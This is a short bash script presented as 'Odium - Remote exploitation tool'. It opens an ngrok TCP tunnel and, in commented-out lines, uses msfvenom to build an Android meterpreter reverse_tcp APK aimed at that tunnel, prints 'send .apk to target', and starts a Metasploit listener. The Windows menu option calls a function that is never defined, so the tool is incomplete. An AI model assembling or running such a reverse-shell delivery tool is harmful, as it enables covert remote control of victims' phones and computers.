#!/bin/bash

####

# jq install

####

config_file='config/metasploit_string.rb'
local_port=4444

tcp_host=$(curl -s localhost:4040/api/tunnels | jq -r ".tunnels[0].public_url" | awk -F "//" '{print $2}' | awk -F ":" '{print $1}')
tcp_port=$(curl -s localhost:4040/api/tunnels | jq -r ".tunnels[0].public_url" | awk -F ":" '{print $3}')

banner(){
   clear
   cat config/banner.txt 
}


start_android(){
   banner
   printf "[*] Starting ngrok at port: $local_port...\n"
   ngrok tcp 4444 --log=stdout > log/ngrok.log &
   printf "HOST: $tcp_host PORT: $tcp_port\n"
   # printf "[*] Ngrok forwarding address: $tcp_host and port: $tcp_port\n"
   # printf "[*] Generating .apk payload...\n"
   # msfvenom -p android/meterpreter/reverse_tcp LHOST=$tcp_host LPORT=$tcp_port > odium-test.apk
   # printf "[*] Updating metasploit cmd string file...\n"
   # payload="android/meterpreter/reverse_tcp"
   # # sed -i "s/first_lhos\=.*/iface=$first/" $config_file
   # sed -i "s/LPORT\ .*/LPORT $local_port/" $config_file
   # source $config_file
   # printf "[*] Done, send .apk to target\n"

   # printf "[*] Starting metasploit listener in 3s...\n" 
   # sleep 3
   # msfconsole -q -r $config_file
   printf "[*] Killing ngrok in background in 55s...\n"
   sleep 55
   killall ngrok
   
}


# if [[ $EUID -ne 0 ]]; then
#    printf "[i] Run this script as root!!! Aborting...\n" 
#    exit 1
# fi

banner

printf "| Odium - Remote exploitation tool |

"

printf "Select payload platform:\n
[1] Android
[2] Windows
[*] Exit

"

read -p "[?] Choice: " platform
case $platform in
1)
   start_android;;
2) 
   start_windows;;
    
*) 
   exit;;
esac

